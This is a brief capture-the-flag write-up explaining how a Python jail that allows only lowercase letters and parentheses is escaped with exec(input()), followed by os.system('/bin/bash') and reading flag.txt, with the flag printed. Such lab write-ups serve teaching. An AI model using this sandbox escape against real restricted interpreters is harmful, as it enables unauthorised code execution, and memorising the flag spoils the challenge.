We are given a pyprison where we can only use opening and closing brace and small cased alphabets as the input.

```
while True:
  a = input(">>> ")
  assert all(n in "()abcdefghijklmnopqrstuvwxyz" for n in a)
  exec(a)
```

This means no imports and no OS functions to read the flag.

After going through a lot of pyjail breaks writeups, I was not able to find a solution until after the contest. 

If we enter exec(input()), it opens a input shell in python where we can enter anything and bypass the prison.

```
exec(input())

import os; 
os.system("/bin/bash")

ls

#contents:
#chal
#flag.txt

cat flag.txt
```

Flag is ```ictf{pyprison_more_like_python_as_a_service_12b19a09}```

